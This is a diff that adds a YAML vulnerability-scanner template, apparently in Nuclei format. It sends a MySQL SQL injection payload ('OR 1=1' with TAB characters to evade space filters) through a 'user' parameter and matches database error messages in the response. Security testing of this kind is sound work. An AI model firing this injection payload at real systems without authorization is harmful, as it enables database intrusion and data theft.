@@ -1,0 +1,23 @@
+id: patt-sqli-mysql-bypass-02-user
+name: 'PATT sqli patt-sqli-mysql-bypass-02 via user'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+  - filterspace
+requires:
+  - php
+description: 'PATT MySQL space bypass with TAB %09. [patt:patt-sqli-mysql-bypass-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      user:
+        - '''%09OR%091=1-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
